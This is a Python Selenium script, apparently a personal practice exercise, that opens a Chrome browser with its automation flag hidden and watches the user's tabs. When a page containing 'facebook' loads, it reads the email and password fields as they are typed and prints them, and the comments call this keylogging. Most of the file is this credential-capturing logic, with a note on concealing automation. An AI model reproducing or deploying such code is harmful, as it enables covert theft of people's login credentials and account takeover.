import selenium 
from selenium import webdriver #This is goignt o allow us to use web drivers in order to clal dummy rowserds like chromium
from selenium.webdriver.common.by import By #This is going to allow us to find elements by either their ID or other menas fo form elements
import os  
import sys  


#THIS HAS TO BE RAN ON A NON ROOT SYSTME OTEHRWISE IT WILL CAUSE A SERIS OF UNWANTED CRASHES ON THE MAIN SYSTEM
#https://chromedriver.chromium.org/help/chrome-doesn-t-start

#https://chromedriver.chromium.org/downloads 
#This is where to donwload the chromuum driver from

# https://stackoverflow.com/questions/50138615/webdriverexception-unknown-error-cannot-find-chrome-binary-error-with-selenium 
# This allows us to change the main binary location of where w have our main chromedriver saved 
#The chromium browser is goign to search the mian os for the default location of WHERE WE HAVE CHROME INSTALLED ON THE SYSTEM
#YOU NEED TO HAVE CHROME INSTALLED


#https://www.youtube.com/watch?v=w1ZEEc-ZY4w
#This is good for showing us how ot remove unencrypted passwords for the chrom and chromum browsers on linux systems
# run apt --fix-broken install
# run apt-get install seahorse (This will install a password maangement tool for our system so we can overwrite any and all saved passwords on the system)


#First we need to set the main ooptions for the web drvier we wish to use
chromium_options = webdriver.ChromeOptions()
chromium_options.add_experimental_option('excludeSwitches', ['enable-automation']) #This will allow us to enable automation for the mian browser script 

#Next we need to load in those options 
driver = webdriver.Chrome(options=chromium_options) #This is going to set our main options for the browser settings

#Next we simply call up a main window via the get request for it 
#The client will close as soon as this get request has been made to a web applcation target
driver.get("https://google.com") #This is goint to tell the browser wehn it opens tha the first website to set to it's default one is the google search 
#Next we need to have the web driver wait until a certain amount of time beforre clsoing out the web clinet on the end users system so they can perform actions

#A simply while true loop will keep the program open on the systm until the end user closes out the browser window hdnale
while True:

    #NOw we need to grab the mai window handles for the tabs the ned user hass open on the systme, and then print them to the screen as the program runs

    driver_handles = driver.window_handles

    for x in driver_handles:

        #This is going to allow us to translate the main source infromation from the open handles on it
        src = driver.page_source #THis is going to give us the mian elements of the source code

        if "facebook" in src: #This is goign to ust the "in" keyword to allow us to make data comparisons within variable elements

            os.system("clear")
            print("We've managed to find a matching window handle")
            input("")

            while "facebook" in src: #This is goign to run for as long as a condition is true 
                try:

                    #Now the program will chekc the main informaiton provided
                    find_email = driver.find_element(By.ID, 'email')
                    find_password = driver.find_element(By.ID, 'pass')

                    print(find_email)

                    #Now we simply need to find any and all main elements value as they are being typed and have them returned to us 
                    keylog_email = find_email.get_attribute('value') 
                    keylog_password = find_password.get_attribute('value')

                    print("EMAIL ADDRESS FOR USER IS => ", keylog_email) 
                    print("PASSWORD FOR USER IS => ", keylog_password)

                    input("This is simply goign to perform a value check")

                except selenium.common.exceptions.NoSuchElementException:
                    break
                    print("This line of code is not working")


        os.system("clear")

        print(src)
        
        os.system("sleep 2") #THis will put the system to sleep for about 2 seconcds, so we can save on enumeration resources


#Practice 